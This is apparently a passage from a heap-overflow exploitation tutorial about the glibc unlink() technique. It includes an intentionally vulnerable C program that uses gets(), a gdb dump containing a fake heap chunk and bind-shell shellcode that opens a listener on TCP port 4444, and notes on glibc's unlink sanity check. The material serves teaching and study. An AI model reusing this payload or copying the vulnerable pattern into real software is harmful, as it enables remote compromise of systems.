### 0x0e: Jump Length and Spacer Details
- `0x0e` is the jump length (including the opcode, it becomes `0x10`).
- The use of 'A's as spacers is for simplicity, but any character can be used.
- A shorter sequence could be used, but `"\xeb\x0aAAAAAAAAAA"` better illustrates the concept.

### Modern glibc-2.5 Unlink Sanity Check
- Modern versions of glibc-2.5 include a sanity check during `unlink()`, which can cause issues in certain scenarios.

### 0x0600 - Source Code: hackme.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char* buffers[5];
    int loop;

    for (loop = 0; loop < 5; loop++) {
        gets(buffers[loop]);
    }

    for (loop = 0; loop < 5; loop++) {
        free(buffers[loop]);
    }

    return 0;
}
```

### 0x0604 - Heap Buffer Overflow (BOF) with `free()`
- **Memory Dump:**
  ```gdb
  (gdb) x/84wx 0x804a000
  0x804a000: 0x00000000 0x00000069 0x281885dc 0x281885dc
  0x804a010: 0x45454545 0x45454545 0x45454545 0x45454545
  0x804a020: 0x45454545 0x45454545 0x45454545 0x45454545
  0x804a030: 0x45454545 0x45454545 0x45454545 0x45454545
  0x804a040: 0x45454545 0x45454545 0x45454545 0x45454545
  0x804a050: 0x45454545 0x45454545 0x45454545 0x45454545
  0x804a060: 0x45454545 0x45454545 0x00000068 0xfffffffc
  0x804a070: 0x44444150 0xfffffffc 0x080496b8 0x0804a0e8
  0x804a080: 0x44444400 0x44444444 0x44444444 0x44444444
  0x804a090: 0x44444444 0x44444444 0x44444444 0x44444444
  0x804a0a0: 0x44444444 0x44444444 0x44444444 0x44444444
  0x804a0b0: 0x44444444 0x44444444 0x44444444 0x44444444
  0x804a0c0: 0x44444444 0x44444444 0x44444444 0x44444444
  0x804a0d0: 0x00000044 0x00000000 0x00000000 0x00000000
  0x804a0e0: 0x00000000 0x00000071 0x41410eeb 0x43434343
  0x804a0f0: 0x080496b8 0x43434343 0x4353db31 0x6a026a53
  0x804a100: 0x89995866 0x9680cde1 0x68665243 0x53665c11
  0x804a110: 0x666ae189 0x56515058 0x80cde189 0xe3d166b0
  0x804a120: 0x525280cd 0xe1894356 0x80cd66b0 0x59026a93
  0x804a130: 0x80cd3fb0 0xb0f97949 0x2f68520b 0x6868732f
  0x804a140: 0x6e69622f 0x5352e389 0x80cde189 0x00000000
  ```

- **Pointer to Shellcode:**
  ```gdb
  (gdb) x/4wx 0x80496b8
  0x80496b8: 0x280bf8b0 0x280cdae0 0x280754a4 0x0804a0e8
  ```

- **Shellcode Execution:**
  - The shellcode opens a backdoor shell listener on TCP port 4444.

### 0x0605 - Success
- The shellcode successfully opens a backdoor shell listener on TCP port 4444.

### 0x0700 - Stupid, Atlas is So Stupid!
- Demos often go wrong, even for smart people.

### 0x0701 - The Bad News
- **Unlink Sanity Check:**
  ```c
  #define unlink(P, BK, FD) { \
      FD = P->fd; \
      BK = P->bk; \
      if (__builtin_expect(FD->bk != P || BK->fd != P, 0)) \
          malloc_printerr(check_action, "corrupted double-linked list", P); \
      else { \
          FD->bk = BK; \
          BK->fd = FD; \
      } \
  }
  ```

### 0x0702 - What Now?
- **EOS Overflow (NULL Overwrite):** This makes string-manipulation functions treat the current and next buffer as one string.
- **HEAP Variable Modification:** Modify other variables on the heap.
- **Finding New Ways to Leverage HEAP BOFs:** Creativity is key to discovering new methods. Leverage what you have.

### 0x0800 - Resources
- **Once Upon a Free():** [Phrack Article](http://www.phrack.org/archives/57/p57-0x09)
- **Advanced Malloc Exploits:** [BugHunter.net](http://doc.bughunter.net/buffer-overflow/advanced-malloc-exploits.html)
- **Lin0xx' Amazing RTL Presentation and Notes:** [NoxusFiles](http://www.noxusfiles.com/lin0xx/heap-overwrites-lin0xx.pdf)
- **Shellcoder's Handbook**

### 0x0900 - Special Thanks
- My Creator
- My Family
- Intelguardians
- kenshoto
- 1@stplace

### 0x0901 - And the Graffiti
- **yo visi, werd. vtrace wrox.**
- **drb, you're awesome co-cap'n, even if you are a superstar on the side.**
- **bug, ringwraith, menace, jewel... y'all are worth every struggle.**
- **choops, nologin folks. thku.**

### 0x0902 - Stolen Stuff
- Much text was borrowed from:
  - “Once Upon a Free()”, anonymous, Phrack 57, [Phrack Article](http://www.phrack.org/archives/57/p57-0x09)
  - Song lyrics by Jennifer Knapp, “Martyrs and Thieves”